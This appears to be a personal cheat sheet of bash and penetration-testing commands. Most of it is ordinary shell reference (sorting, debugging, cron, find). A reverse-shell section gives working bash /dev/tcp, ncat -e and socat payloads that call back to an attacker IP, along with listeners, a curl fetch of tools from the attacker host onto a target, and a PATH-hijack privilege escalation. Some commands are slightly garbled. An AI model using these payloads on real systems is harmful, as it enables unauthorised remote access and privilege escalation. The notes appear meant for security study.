# Scripting Commands
## Display
```bash
sort # numerical/alphabetical order
uniq # no duplicate
tail -n +2 # jumps over one line
```

## Debugging
`bash -n script.sh` Without executing, check for syntaxe, raise error
`bash -x script.sh`Execute with verbose on
slice portion of the script to debug
```bash
#!/bin/bash
action # not to be debug
set -x # debug begin
--snip-- # debugged code
set +x # debug end
action # not to be debug
```

## Operators
* `[command] &` send the command to the background
* `([command1];[command2])` () group commands as one ; wait for the first to finish after the second gets executed (no matter if True or False)
* `command1 && command2` executes only if first succeeded 
* `cmd1 || cmd2` executes if the first failed

# Tools
## Send email in the terminal with sendemail
```bash
brew install sendemail
sendemail -f "sender-email" -t "reciever" -u "object" -m "message" -s "smtp.gmail.com:587" -xu "send-email" -xp "key" -o tls=yes
```
to generate the key (Gmail) : Google Account > Activate double authentification > App passwords

## Nuclei
stored template at ~/.local/nuclei-templates
```bash
nuclei -u <BaseUrl> -t <path-to-template> # first run will install official templates if not downloaded yet
nuclei -tags <tag>,<tag> -u ip # run specific template
```
output syntax : [template][protocol][severity] url [extractor]

## Fuff / Fuzzing
```bash
fuff - -w wordlist.txt -u <http://...>/FUZZ # -c color, FUZZ will be replaced by wordlist entry
wfuzz -sc <http-code> <wordlist.txt> <http://ip:port> # recieve only for this code
```

# Reverse shell

Set up a listener (before upload + executing the payload)
```bash
nc -l -p <port> -vv # verbose, listen on port...
pwncat-vl -l -p <port> # pwncat-cs no longer maintained for modern Python
ncat -v -l <port> --ssl # for encryption (Secure Socket Layer)
socat - tcp-listen:<port>, fork # ensure listener remains alive, - for stdin/stdout
socat file:$(tty), raw, echo=0 tccp=listen:<port> # uses attacker's terminal located at tty. Raw for immediate charaters transmission 
```

Make the target execute the payload through vulnerability exploit
```bash
bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' # redirect stdout and stderr to attacker machine and input to be executed where the stdout comes from (socket creation). For TCP socket 
ncat <attacker-ip> <port> --ssl -e /bin/bash -v # for SSL connection, the target needs netcat binary
socat exec 'bash -i',pty,stderr tcp:<attacker-ip>:<port> #pty pseudo-terminal connected to socket, -i Interactive bash, redirects stderr to attacker
```

After executing the payload, type commands (remote acccess)
## Tools
pwncat-vl
```bash
help
back # remote terminal
upload [source file] [destination]
```

Binary (netcat, nmap...) sharing between Kali - Target with curl 
```bash
python -m http.server <port>
which <binary>
cp <path> <repertory> # where python server running
cd /var/www/html # on target, binary to be wrote within
curl -O http://<attacker-ip>:<python-server-port>/<binary>
```

# Investigation
```bash
find <departus-point> -name <name> -o -name # -o or. Departus can be multiple root
find / -name -regex "<match>"
find / -type f
```

# Automation
## Cron
```bash
crontab -e # open a crontab edit file to append script to automatize
* * * * * /path/to/script.sh # execute the script every minutes
* * * * * <command> >> /tmp/file.log # handle the output
```
nb of * depends when to execute :
* `* * * * *` every minutes (`*/5 * * * *`for every five minutes, `5 * * * *` each 05 of each hours)
* `0 * * * * ` every hours
* `0 0 * * * ` every days (of the month)
* `0 0 1 * * ` every month
* `0 0 * * 0 ` every day (of the week, 0 being sunday)
Examples : every 11:30pm = 30 23 * * *

## At
```bash
at <time-repetition> # example : now + 1 minute, 11pm, tomorrow...
<command> # Ctrl + D to save
atq # see running jobs
atrm <id> # remove
```

# Privilege escalation
## PATH
1. `cp /bin/<commmand> /tmp/<user-dir>`to create a fake command (cat->ls)
2. `export PATH=/tmp/<user-dir>:$PATH` in script to make read our path first:real one second
will be executed on SUID right file (user can execute with owner's privilege)